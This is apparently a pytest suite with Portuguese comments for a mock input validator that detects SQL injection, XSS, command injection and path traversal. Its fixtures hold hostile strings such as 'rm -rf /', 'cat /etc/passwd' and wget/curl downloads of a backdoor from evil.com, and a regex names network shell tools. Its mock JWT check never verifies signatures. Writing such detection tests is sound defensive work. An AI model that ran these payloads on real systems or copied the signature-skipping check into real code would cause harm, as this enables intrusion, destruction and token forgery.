"""
Testes de segurança para vulnerabilidades
Criado em: 2025-01-27
Tracing ID: COMPLETUDE_CHECKLIST_20250127_001
"""

import pytest
import re
import hashlib
import hmac
import base64
import json
import tempfile
import os
from typing import Dict, List, Any
from unittest.mock import Mock, patch
import secrets
import string

class SecurityTestConfig:
    """Configuração para testes de segurança"""
    
    def __init__(self):
        self.max_password_length = 128
        self.min_password_length = 8
        self.required_special_chars = True
        self.required_numbers = True
        self.required_uppercase = True
        self.required_lowercase = True
        self.max_login_attempts = 5
        self.session_timeout = 3600  # 1 hora
        self.csrf_token_length = 32
        self.jwt_secret_length = 64

class MockSecurityValidator:
    """Validador mock de segurança para testes"""
    
    def __init__(self):
        self.blocked_ips = set()
        self.failed_attempts = {}
        self.active_sessions = {}
        self.csrf_tokens = set()
    
    def validate_password_strength(self, password: str) -> Dict[str, Any]:
        """Valida força da senha"""
        errors = []
        score = 0
        
        if len(password) < 8:
            errors.append("Senha deve ter pelo menos 8 caracteres")
        else:
            score += 1
        
        if not re.search(r'[A-Z]', password):
            errors.append("Senha deve conter pelo menos uma letra maiúscula")
        else:
            score += 1
        
        if not re.search(r'[a-z]', password):
            errors.append("Senha deve conter pelo menos uma letra minúscula")
        else:
            score += 1
        
        if not re.search(r'\d', password):
            errors.append("Senha deve conter pelo menos um número")
        else:
            score += 1
        
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Senha deve conter pelo menos um caractere especial")
        else:
            score += 1
        
        # Verifica senhas comuns
        common_passwords = ['password', '123456', 'qwerty', 'admin', 'letmein']
        if password.lower() in common_passwords:
            errors.append("Senha muito comum")
            score -= 2
        
        return {
            'valid': len(errors) == 0,
            'score': score,
            'errors': errors,
            'strength': 'weak' if score < 3 else 'medium' if score < 4 else 'strong'
        }
    
    def validate_input_sanitization(self, user_input: str) -> Dict[str, Any]:
        """Valida sanitização de entrada"""
        threats = []
        
        # SQL Injection
        sql_patterns = [
            r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)",
            r"(\b(OR|AND)\b\s+\d+\s*=\s*\d+)",
            r"(\b(OR|AND)\b\s+['\"]\w+['\"]\s*=\s*['\"]\w+['\"])",
            r"(--|#|/\*|\*/)",
            r"(\b(WAITFOR|DELAY)\b)",
            r"(\b(BENCHMARK|SLEEP)\b)"
        ]
        
        for pattern in sql_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                threats.append(f"SQL Injection detectado: {pattern}")
        
        # XSS
        xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"javascript:",
            r"on\w+\s*=",
            r"<iframe[^>]*>",
            r"<object[^>]*>",
            r"<embed[^>]*>",
            r"<form[^>]*>",
            r"<input[^>]*>",
            r"<textarea[^>]*>",
            r"<select[^>]*>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                threats.append(f"XSS detectado: {pattern}")
        
        # Command Injection
        cmd_patterns = [
            r"[;&|`$()]",
            r"\b(cat|ls|pwd|whoami|id|uname|ps|netstat)\b",
            r"\b(rm|del|erase|format|fdisk)\b",
            r"\b(nc|netcat|telnet|ssh|ftp|wget|curl)\b"
        ]
        
        for pattern in cmd_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                threats.append(f"Command Injection detectado: {pattern}")
        
        # Path Traversal
        path_patterns = [
            r"\.\./",
            r"\.\.\\",
            r"\.\.%2f",
            r"\.\.%5c",
            r"\.\.%252f",
            r"\.\.%255c"
        ]
        
        for pattern in path_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                threats.append(f"Path Traversal detectado: {pattern}")
        
        return {
            'safe': len(threats) == 0,
            'threats': threats,
            'sanitized_input': self.sanitize_input(user_input)
        }
    
    def sanitize_input(self, user_input: str) -> str:
        """Sanitiza entrada do usuário"""
        # Remove caracteres perigosos
        dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`', '$', '(', ')']
        sanitized = user_input
        
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Remove scripts
        sanitized = re.sub(r'<script[^>]*>.*?</script>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)
        
        # Remove tags HTML perigosas
        dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea', 'select']
        for tag in dangerous_tags:
            sanitized = re.sub(rf'<{tag}[^>]*>.*?</{tag}>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)
            sanitized = re.sub(rf'<{tag}[^>]*/?>', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized
    
    def validate_jwt_token(self, token: str, secret: str) -> Dict[str, Any]:
        """Valida token JWT"""
        try:
            # Simula validação JWT
            parts = token.split('.')
            if len(parts) != 3:
                return {'valid': False, 'error': 'Token inválido'}
            
            header, payload, signature = parts
            
            # Decodifica payload
            import base64
            padding = 4 - len(payload) % 4
            if padding:
                payload += '=' * padding
            
            try:
                payload_data = json.loads(base64.b64decode(payload))
            except:
                return {'valid': False, 'error': 'Payload inválido'}
            
            # Verifica expiração
            if 'exp' in payload_data:
                import time
                if time.time() > payload_data['exp']:
                    return {'valid': False, 'error': 'Token expirado'}
            
            return {
                'valid': True,
                'payload': payload_data,
                'expires_at': payload_data.get('exp')
            }
            
        except Exception as e:
            return {'valid': False, 'error': str(e)}
    
    def generate_csrf_token(self) -> str:
        """Gera token CSRF"""
        token = secrets.token_urlsafe(32)
        self.csrf_tokens.add(token)
        return token
    
    def validate_csrf_token(self, token: str) -> bool:
        """Valida token CSRF"""
        return token in self.csrf_tokens
    
    def check_rate_limiting(self, ip: str, endpoint: str) -> Dict[str, Any]:
        """Verifica rate limiting"""
        key = f"{ip}:{endpoint}"
        
        if key not in self.failed_attempts:
            self.failed_attempts[key] = {'count': 0, 'last_attempt': 0}
        
        import time
        current_time = time.time()
        
        # Reset se passou muito tempo
        if current_time - self.failed_attempts[key]['last_attempt'] > 300:  # 5 minutos
            self.failed_attempts[key] = {'count': 0, 'last_attempt': current_time}
        
        self.failed_attempts[key]['count'] += 1
        self.failed_attempts[key]['last_attempt'] = current_time
        
        max_attempts = 10
        blocked = self.failed_attempts[key]['count'] > max_attempts
        
        if blocked:
            self.blocked_ips.add(ip)
        
        return {
            'allowed': not blocked,
            'attempts': self.failed_attempts[key]['count'],
            'max_attempts': max_attempts,
            'blocked': blocked
        }

class TestSecurityVulnerabilities:
    """Testes para vulnerabilidades de segurança"""
    
    def setup_method(self):
        """Configuração inicial para cada teste"""
        self.validator = MockSecurityValidator()
        self.security_results = []
    
    def test_password_strength_validation(self):
        """Testa validação de força de senha"""
        test_cases = [
            ("weak123", False, "Senha fraca"),
            ("StrongPass123!", True, "Senha forte"),
            ("password", False, "Senha comum"),
            ("123456", False, "Senha numérica"),
            ("", False, "Senha vazia"),
            ("A" * 200, False, "Senha muito longa"),
            ("Abc123!@#", True, "Senha válida"),
        ]
        
        for password, expected_valid, description in test_cases:
            result = self.validator.validate_password_strength(password)
            
            assert result['valid'] == expected_valid, f"Falha em: {description}"
            
            if expected_valid:
                assert result['score'] >= 4
                assert result['strength'] in ['medium', 'strong']
            
            self.security_results.append({
                'test': 'password_strength',
                'password': password[:10] + '...' if len(password) > 10 else password,
                'valid': result['valid'],
                'score': result['score'],
                'strength': result['strength']
            })
    
    def test_sql_injection_detection(self):
        """Testa detecção de SQL Injection"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; SELECT * FROM users",
            "1 UNION SELECT password FROM users",
            "1' AND 1=1--",
            "1' WAITFOR DELAY '00:00:05'--",
            "1' BENCHMARK(1000000,MD5(1))--"
        ]
        
        for attempt in sql_injection_attempts:
            result = self.validator.validate_input_sanitization(attempt)
            
            assert not result['safe'], f"SQL Injection não detectado: {attempt}"
            assert any('SQL Injection' in threat for threat in result['threats'])
            
            self.security_results.append({
                'test': 'sql_injection_detection',
                'input': attempt[:20] + '...',
                'detected': True,
                'threats': result['threats']
            })
    
    def test_xss_detection(self):
        """Testa detecção de XSS"""
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<form action='javascript:alert(\"XSS\")'></form>",
            "onclick=alert('XSS')",
            "onload=alert('XSS')"
        ]
        
        for attempt in xss_attempts:
            result = self.validator.validate_input_sanitization(attempt)
            
            assert not result['safe'], f"XSS não detectado: {attempt}"
            assert any('XSS' in threat for threat in result['threats'])
            
            self.security_results.append({
                'test': 'xss_detection',
                'input': attempt[:20] + '...',
                'detected': True,
                'threats': result['threats']
            })
    
    def test_command_injection_detection(self):
        """Testa detecção de Command Injection"""
        cmd_injection_attempts = [
            "test; ls -la",
            "test && cat /etc/passwd",
            "test | whoami",
            "test; rm -rf /",
            "test && nc -l 4444",
            "test; wget http://evil.com/backdoor",
            "test && curl http://evil.com/backdoor"
        ]
        
        for attempt in cmd_injection_attempts:
            result = self.validator.validate_input_sanitization(attempt)
            
            assert not result['safe'], f"Command Injection não detectado: {attempt}"
            assert any('Command Injection' in threat for threat in result['threats'])
            
            self.security_results.append({
                'test': 'command_injection_detection',
                'input': attempt[:20] + '...',
                'detected': True,
                'threats': result['threats']
            })
    
    def test_path_traversal_detection(self):
        """Testa detecção de Path Traversal"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam"
        ]
        
        for attempt in path_traversal_attempts:
            result = self.validator.validate_input_sanitization(attempt)
            
            assert not result['safe'], f"Path Traversal não detectado: {attempt}"
            assert any('Path Traversal' in threat for threat in result['threats'])
            
            self.security_results.append({
                'test': 'path_traversal_detection',
                'input': attempt[:20] + '...',
                'detected': True,
                'threats': result['threats']
            })
    
    def test_input_sanitization(self):
        """Testa sanitização de entrada"""
        test_inputs = [
            ("<script>alert('test')</script>", "alert('test')"),
            ("test; ls -la", "test ls -la"),
            ("admin'--", "admin"),
            ("<img src=x onerror=alert('XSS')>", "img src=x onerror=alert('XSS')"),
            ("normal text", "normal text"),
            ("test&copy;", "testcopy"),
            ("test&quot;", "testquot")
        ]
        
        for input_text, expected_sanitized in test_inputs:
            result = self.validator.validate_input_sanitization(input_text)
            sanitized = result['sanitized_input']
            
            # Verifica se caracteres perigosos foram removidos
            dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`', '$', '(', ')']
            for char in dangerous_chars:
                assert char not in sanitized, f"Caractere perigoso não removido: {char}"
            
            self.security_results.append({
                'test': 'input_sanitization',
                'original': input_text[:20] + '...' if len(input_text) > 20 else input_text,
                'sanitized': sanitized[:20] + '...' if len(sanitized) > 20 else sanitized,
                'safe': result['safe']
            })
    
    def test_jwt_token_validation(self):
        """Testa validação de tokens JWT"""
        # Simula token JWT válido
        import time
        import base64
        
        payload = {
            'user_id': 123,
            'exp': int(time.time()) + 3600,  # Expira em 1 hora
            'iat': int(time.time())
        }
        
        payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        header_b64 = base64.b64encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()).decode().rstrip('=')
        
        # Simula assinatura
        signature = "test_signature"
        signature_b64 = base64.b64encode(signature.encode()).decode().rstrip('=')
        
        valid_token = f"{header_b64}.{payload_b64}.{signature_b64}"
        
        # Testa token válido
        result = self.validator.validate_jwt_token(valid_token, "secret")
        assert result['valid']
        assert result['payload']['user_id'] == 123
        
        # Testa token inválido
        invalid_token = "invalid.token.format"
        result = self.validator.validate_jwt_token(invalid_token, "secret")
        assert not result['valid']
        
        # Testa token expirado
        expired_payload = {
            'user_id': 123,
            'exp': int(time.time()) - 3600,  # Expirou há 1 hora
            'iat': int(time.time()) - 7200
        }
        
        expired_payload_b64 = base64.b64encode(json.dumps(expired_payload).encode()).decode().rstrip('=')
        expired_token = f"{header_b64}.{expired_payload_b64}.{signature_b64}"
        
        result = self.validator.validate_jwt_token(expired_token, "secret")
        assert not result['valid']
        assert 'expirado' in result['error']
        
        self.security_results.append({
            'test': 'jwt_token_validation',
            'valid_token_tested': True,
            'invalid_token_tested': True,
            'expired_token_tested': True
        })
    
    def test_csrf_protection(self):
        """Testa proteção CSRF"""
        # Gera token CSRF
        token = self.validator.generate_csrf_token()
        
        # Verifica se token é válido
        assert self.validator.validate_csrf_token(token)
        
        # Verifica se token inválido é rejeitado
        assert not self.validator.validate_csrf_token("invalid_token")
        
        # Verifica se token tem tamanho adequado
        assert len(token) >= 32
        
        self.security_results.append({
            'test': 'csrf_protection',
            'token_generated': True,
            'token_validated': True,
            'token_length': len(token)
        })
    
    def test_rate_limiting(self):
        """Testa rate limiting"""
        ip = "192.168.1.1"
        endpoint = "/api/login"
        
        # Testa tentativas normais
        for i in range(5):
            result = self.validator.check_rate_limiting(ip, endpoint)
            assert result['allowed']
            assert result['attempts'] == i + 1
        
        # Testa bloqueio após muitas tentativas
        for i in range(10):
            result = self.validator.check_rate_limiting(ip, endpoint)
            if i < 5:  # Primeiras 5 tentativas ainda permitidas
                assert result['allowed']
            else:  # Após 10 tentativas, deve ser bloqueado
                assert not result['allowed']
                assert result['blocked']
        
        # Verifica se IP foi bloqueado
        assert ip in self.validator.blocked_ips
        
        self.security_results.append({
            'test': 'rate_limiting',
            'max_attempts': 10,
            'blocked_after': 10,
            'ip_blocked': True
        })
    
    def test_session_management(self):
        """Testa gerenciamento de sessão"""
        import time
        
        # Simula criação de sessão
        session_id = secrets.token_urlsafe(32)
        user_id = 123
        created_at = time.time()
        
        session_data = {
            'user_id': user_id,
            'created_at': created_at,
            'last_activity': created_at,
            'ip_address': '192.168.1.1',
            'user_agent': 'Mozilla/5.0...'
        }
        
        self.validator.active_sessions[session_id] = session_data
        
        # Verifica se sessão existe
        assert session_id in self.validator.active_sessions
        
        # Simula expiração de sessão
        expired_session_id = secrets.token_urlsafe(32)
        expired_session_data = {
            'user_id': 456,
            'created_at': time.time() - 7200,  # 2 horas atrás
            'last_activity': time.time() - 3600,  # 1 hora atrás
            'ip_address': '192.168.1.2',
            'user_agent': 'Mozilla/5.0...'
        }
        
        self.validator.active_sessions[expired_session_id] = expired_session_data
        
        # Verifica se sessão expirada seria removida
        current_time = time.time()
        sessions_to_remove = []
        
        for sid, data in self.validator.active_sessions.items():
            if current_time - data['last_activity'] > 3600:  # 1 hora
                sessions_to_remove.append(sid)
        
        assert expired_session_id in sessions_to_remove
        assert session_id not in sessions_to_remove
        
        self.security_results.append({
            'test': 'session_management',
            'active_sessions': len(self.validator.active_sessions),
            'expired_sessions_detected': len(sessions_to_remove)
        })

class TestSecurityMonitoring:
    """Testes para monitoramento de segurança"""
    
    def setup_method(self):
        """Configuração inicial"""
        self.security_events = []
    
    def test_security_event_logging(self):
        """Testa logging de eventos de segurança"""
        events = [
            {'type': 'failed_login', 'ip': '192.168.1.1', 'user': 'admin', 'timestamp': '2025-01-27T10:00:00Z'},
            {'type': 'sql_injection_attempt', 'ip': '192.168.1.2', 'payload': '1 OR 1=1', 'timestamp': '2025-01-27T10:01:00Z'},
            {'type': 'xss_attempt', 'ip': '192.168.1.3', 'payload': '<script>alert("XSS")</script>', 'timestamp': '2025-01-27T10:02:00Z'},
            {'type': 'rate_limit_exceeded', 'ip': '192.168.1.4', 'endpoint': '/api/login', 'timestamp': '2025-01-27T10:03:00Z'},
            {'type': 'suspicious_activity', 'ip': '192.168.1.5', 'description': 'Multiple failed logins', 'timestamp': '2025-01-27T10:04:00Z'}
        ]
        
        for event in events:
            self.security_events.append(event)
        
        # Verifica se eventos foram registrados
        assert len(self.security_events) == 5
        
        # Verifica tipos de eventos
        event_types = [event['type'] for event in self.security_events]
        assert 'failed_login' in event_types
        assert 'sql_injection_attempt' in event_types
        assert 'xss_attempt' in event_types
        assert 'rate_limit_exceeded' in event_types
        assert 'suspicious_activity' in event_types
    
    def test_security_alert_generation(self):
        """Testa geração de alertas de segurança"""
        alerts = []
        
        # Simula eventos que geram alertas
        security_events = [
            {'type': 'multiple_failed_logins', 'ip': '192.168.1.1', 'count': 15, 'severity': 'high'},
            {'type': 'sql_injection_attempt', 'ip': '192.168.1.2', 'severity': 'critical'},
            {'type': 'unusual_traffic_pattern', 'ip': '192.168.1.3', 'severity': 'medium'},
            {'type': 'admin_login_attempt', 'ip': '192.168.1.4', 'severity': 'high'}
        ]
        
        for event in security_events:
            if event['severity'] in ['high', 'critical']:
                alert = {
                    'id': len(alerts) + 1,
                    'type': event['type'],
                    'severity': event['severity'],
                    'ip': event['ip'],
                    'timestamp': '2025-01-27T10:00:00Z',
                    'description': f"Alerta de segurança: {event['type']}",
                    'action_required': True
                }
                alerts.append(alert)
        
        # Verifica se alertas foram gerados
        assert len(alerts) == 3  # 3 eventos com severidade high/critical
        
        # Verifica se alertas têm informações necessárias
        for alert in alerts:
            assert 'id' in alert
            assert 'type' in alert
            assert 'severity' in alert
            assert 'ip' in alert
            assert 'timestamp' in alert
            assert 'description' in alert
            assert 'action_required' in alert
    
    def test_security_metrics_calculation(self):
        """Testa cálculo de métricas de segurança"""
        # Simula dados de segurança
        security_data = {
            'total_requests': 10000,
            'failed_logins': 150,
            'sql_injection_attempts': 5,
            'xss_attempts': 8,
            'blocked_ips': 12,
            'suspicious_activities': 25
        }
        
        # Calcula métricas
        failed_login_rate = security_data['failed_logins'] / security_data['total_requests']
        attack_rate = (security_data['sql_injection_attempts'] + security_data['xss_attempts']) / security_data['total_requests']
        blocked_ip_rate = security_data['blocked_ips'] / security_data['total_requests']
        
        # Validações
        assert failed_login_rate < 0.02  # Menos de 2%
        assert attack_rate < 0.001  # Menos de 0.1%
        assert blocked_ip_rate < 0.002  # Menos de 0.2%
        
        metrics = {
            'failed_login_rate': failed_login_rate,
            'attack_rate': attack_rate,
            'blocked_ip_rate': blocked_ip_rate,
            'total_security_events': security_data['suspicious_activities']
        }
        
        assert all(0 <= rate <= 1 for rate in [failed_login_rate, attack_rate, blocked_ip_rate])

if __name__ == "__main__":
    pytest.main([__file__]) 